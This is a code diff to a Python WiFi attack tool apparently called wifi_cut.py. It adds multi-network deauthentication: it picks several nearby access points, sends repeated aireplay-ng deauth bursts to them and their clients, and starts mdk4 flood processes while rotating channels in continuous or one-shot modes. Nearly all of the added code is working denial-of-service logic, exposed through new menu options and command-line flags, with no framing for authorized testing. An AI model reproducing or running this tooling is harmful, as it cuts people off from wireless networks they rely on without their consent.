@@ -520,6 +520,214 @@ def discover_clients(
     return found
 
 
+def sort_networks_list(networks: Dict[str, Network]) -> List[Network]:
+    return sorted(
+        networks.values(),
+        key=lambda n: int(n.power) if n.power.lstrip("-").isdigit() else -999,
+        reverse=True,
+    )
+
+
+def parse_target_selection(sel: str, sorted_nets: List[Network]) -> List[Network]:
+    """Parse 3 / 1,3,5 / 2-6 / all into a list of Network targets."""
+    if not sel or sel.strip() == "0":
+        return []
+
+    text = sel.strip().lower()
+    if text == "all":
+        return list(sorted_nets)
+
+    indices: Set[int] = set()
+    for part in re.split(r"[\s,]+", text):
+        if not part:
+            continue
+        if "-" in part:
+            bounds = part.split("-", 1)
+            if len(bounds) == 2 and bounds[0].isdigit() and bounds[1].isdigit():
+                start, end = int(bounds[0]), int(bounds[1])
+                for i in range(min(start, end), max(start, end) + 1):
+                    indices.add(i)
+        elif part.isdigit():
+            indices.add(int(part))
+
+    targets: List[Network] = []
+    for i in sorted(indices):
+        if 1 <= i <= len(sorted_nets):
+            targets.append(sorted_nets[i - 1])
+    return targets
+
+
+def display_multi_targets(targets: List[Network]):
+    print(f"\n{BD}Selected {len(targets)} network(s):{RS}")
+    print(f"{BD}{'─' * 60}{RS}")
+    for i, net in enumerate(targets, 1):
+        enc = net.encryption[:8] if net.encryption else "?"
+        print(f"  {i}. {net.display_name}  {net.bssid}  ch{net.channel}  {enc}")
+    print(f"{BD}{'─' * 60}{RS}")
+    print(f"{GR}  One adapter rotates channels — each AP is attacked in turn.{RS}\n")
+
+
+def deauth_burst_on_ap(
+    mon_iface: str,
+    bssid: str,
+    channel: str,
+    aggressive: bool,
+    client_macs: Optional[List[str]] = None,
+) -> int:
+    ch = normalize_channel(channel)
+    if ch:
+        lock_channel(mon_iface, ch)
+    burst = 64 if aggressive else 32
+    total = 0
+    run_aireplay_deauth(mon_iface, bssid, burst)
+    total += burst
+    for mac in client_macs or []:
+        run_aireplay_deauth(mon_iface, bssid, 16, mac)
+        total += 16
+    return total
+
+
+def start_mdk4_multi_bssids(
+    mon_iface: str,
+    targets: List[Network],
+    channel: str,
+) -> Optional[subprocess.Popen]:
+    if not tool_exists("mdk4") or not targets:
+        return None
+    ch = normalize_channel(channel)
+    if not ch:
+        return None
+    list_path = os.path.join(
+        tempfile.gettempdir(), f"wificut_multi_{ch}.blacklist",
+    )
+    with open(list_path, "w", encoding="utf-8") as f:
+        for t in targets:
+            f.write(t.bssid + "\n")
+    try:
+        return subprocess.Popen(
+            ["mdk4", mon_iface, "d", "-B", list_path, "-c", ch, "-s", "250"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    except OSError:
+        return None
+
+
+def multi_deauth_attack(
+    mon_iface: str,
+    targets: List[Network],
+    count: int = 0,
+    aggressive: bool = False,
+    dwell: float = 2.0,
+    clients_map: Optional[Dict[str, List[str]]] = None,
+):
+    """Attack multiple APs by rotating through their channels."""
+    if not targets:
+        print(f"{Y}No targets selected.{RS}")
+        return
+
+    display_multi_targets(targets)
+    print(f"\n{R}{BD}▶ Multi-network attack ({len(targets)} APs){RS}")
+    if count == 0:
+        print(f"{Y}  Mode: continuous rotation (Ctrl+C to stop){RS}")
+    if aggressive:
+        print(f"{GR}  Aggressive: heavy deauth + mdk4 per channel group{RS}")
+
+    by_channel: Dict[str, List[Network]] = {}
+    for t in targets:
+        ch = normalize_channel(t.channel) or "0"
+        by_channel.setdefault(ch, []).append(t)
+
+    mdk4_proc: Optional[subprocess.Popen] = None
+    total_sent = 0
+
+    def stop_mdk4():
+        nonlocal mdk4_proc
+        if mdk4_proc and mdk4_proc.poll() is None:
+            mdk4_proc.terminate()
+            try:
+                mdk4_proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                mdk4_proc.kill()
+        mdk4_proc = None
+
+    try:
+        if count == 0:
+            current_ch: Optional[str] = None
+            while True:
+                for target in targets:
+                    ch = normalize_channel(target.channel) or "0"
+                    clients = (clients_map or {}).get(target.bssid, [])
+                    if aggressive and ch != current_ch:
+                        stop_mdk4()
+                        mdk4_proc = start_mdk4_multi_bssids(
+                            mon_iface, by_channel.get(ch, [target]), ch,
+                        )
+                        current_ch = ch
+                    total_sent += deauth_burst_on_ap(
+                        mon_iface, target.bssid, target.channel, aggressive, clients,
+                    )
+                    label = f"{target.display_name} ch{target.channel}"
+                    print(
+                        f"\r  {R}Rotating → {label}  frames≈{total_sent}{RS}",
+                        end="", flush=True,
+                    )
+                    time.sleep(dwell)
+        else:
+            per_target = max(32, count // max(1, len(targets)))
+            for target in targets:
+                ch = normalize_channel(target.channel) or "0"
+                clients = (clients_map or {}).get(target.bssid, [])
+                if aggressive:
+                    stop_mdk4()
+                    mdk4_proc = start_mdk4_multi_bssids(
+                        mon_iface, by_channel.get(ch, [target]), ch,
+                    )
+                    time.sleep(1)
+                rounds = max(1, per_target // 32)
+                for _ in range(rounds):
+                    total_sent += deauth_burst_on_ap(
+                        mon_iface, target.bssid, target.channel, aggressive, clients,
+                    )
+                print(f"  {G}Attacked: {target.display_name} ({target.bssid}){RS}")
+            stop_mdk4()
+            print(f"{G}  Multi attack complete (~{total_sent} frames).{RS}")
+    except KeyboardInterrupt:
+        print(f"\n{Y}  Multi attack stopped.{RS}")
+    finally:
+        stop_mdk4()
+
+
+def handle_multi_targets(
+    mon_iface: str,
+    targets: List[Network],
+    networks: Dict[str, Network],
+):
+    while True:
+        display_multi_targets(targets)
+        print(f"{BD}Multi-target options:{RS}")
+        print(f"  1. Continuous rotation (all selected WiFi)")
+        print(f"  2. Aggressive continuous (mdk4 + flood)")
+        print(f"  3. One-shot burst on each network")
+        print(f"  0. Back to scan")
+
+        opt = safe_input(f"{C}Choose action: {RS}")
+        if opt is None or opt == "0":
+            break
+        if opt == "1":
+            multi_deauth_attack(mon_iface, targets, count=0, aggressive=False)
+        elif opt == "2":
+            multi_deauth_attack(mon_iface, targets, count=0, aggressive=True)
+        elif opt == "3":
+            count_raw = safe_input(f"{C}Frames per network (default 64): {RS}")
+            if count_raw is None:
+                break
+            count = int(count_raw) if count_raw.isdigit() else 64
+            multi_deauth_attack(mon_iface, targets, count=count, aggressive=False)
+        else:
+            print(f"{R}Invalid option{RS}")
+
+
 def display_networks(networks: Dict[str, Network]):
     if not networks:
         print(f"{Y}No WiFi networks detected. Check monitor mode support and nearby signals.{RS}")
@@ -695,25 +903,25 @@ def interactive_mode(mon_iface: str):
                     break
                 continue
 
-            sel = safe_input(f"{C}Select target # (0=quit): {RS}")
+            sel = safe_input(
+                f"{C}Select target # (0=quit, all, or 1,3,5 / 2-6): {RS}",
+            )
             if sel is None:
                 break
             if sel == "0" or not sel:
                 break
-            try:
-                idx = int(sel)
-                sorted_nets = sorted(
-                    networks.values(),
-                    key=lambda n: int(n.power) if n.power.lstrip("-").isdigit() else -999,
-                    reverse=True,
-                )
-                if idx < 1 or idx > len(sorted_nets):
-                    print(f"{R}Invalid selection{RS}")
-                    continue
-                target = sorted_nets[idx - 1]
-            except ValueError:
-                print(f"{R}Please enter a number{RS}")
+
+            sorted_nets = sort_networks_list(networks)
+            targets = parse_target_selection(sel, sorted_nets)
+            if not targets:
+                print(f"{R}Invalid selection — try: 3  or  1,4,7  or  2-5  or  all{RS}")
                 continue
+
+            if len(targets) > 1:
+                handle_multi_targets(mon_iface, targets, networks)
+                continue
+
+            target = targets[0]
 
             warn_encryption(target)
             target.clients = discover_clients(
@@ -870,6 +1078,7 @@ Examples:
   sudo python3 wifi_cut.py -i wlan0           # specify interface
   sudo python3 wifi_cut.py -i wlan0 --scan 30 # scan for 30 seconds
   sudo python3 wifi_cut.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth-all
+  sudo python3 wifi_cut.py -i wlan0 --bssids AA:BB:...,11:22:... --multi-deauth --continuous
   sudo python3 wifi_cut.py --check              # diagnose scan issues
         """,
     )
@@ -879,6 +1088,15 @@ Examples:
     parser.add_argument("--channel", help="Lock scan/attack to channel (e.g. 6)")
     parser.add_argument("--aggressive", action="store_true", help="Use mdk4 flood + heavy deauth")
     parser.add_argument("-b", "--bssid", help="Target AP BSSID")
+    parser.add_argument(
+        "--bssids",
+        help="Comma-separated BSSIDs for multi-network attack (use with --multi-deauth)",
+    )
+    parser.add_argument(
+        "--multi-deauth",
+        action="store_true",
+        help="Attack multiple APs from --bssids (rotates channels)",
+    )
     parser.add_argument("-c", "--client", help="Target client MAC (optional)")
     parser.add_argument("--deauth-all", action="store_true", help="Disconnect all clients on AP")
     parser.add_argument("--deauth-count", type=int, default=20, help="Number of deauth bursts")
@@ -928,7 +1146,25 @@ Examples:
     print(f"{G}Monitor interface: {mon_iface}{RS}")
 
     try:
-        if args.bssid and (args.deauth_all or args.client or args.continuous):
+        if args.bssids and args.multi_deauth:
+            bssids = [b.strip().upper() for b in args.bssids.split(",") if b.strip()]
+            networks = scan_networks(mon_iface, duration=args.scan)
+            targets = []
+            for b in bssids:
+                if b in networks:
+                    targets.append(networks[b])
+                else:
+                    print(f"{Y}BSSID not in scan: {b}{RS}")
+            if not targets:
+                print(f"{R}No valid targets from --bssids{RS}")
+            else:
+                multi_deauth_attack(
+                    mon_iface,
+                    targets,
+                    count=0 if args.continuous else args.deauth_count,
+                    aggressive=args.aggressive or args.continuous,
+                )
+        elif args.bssid and (args.deauth_all or args.client or args.continuous):
             count = 0 if args.continuous else args.deauth_count
             ch = args.channel
             nets: Dict[str, Network] = {}
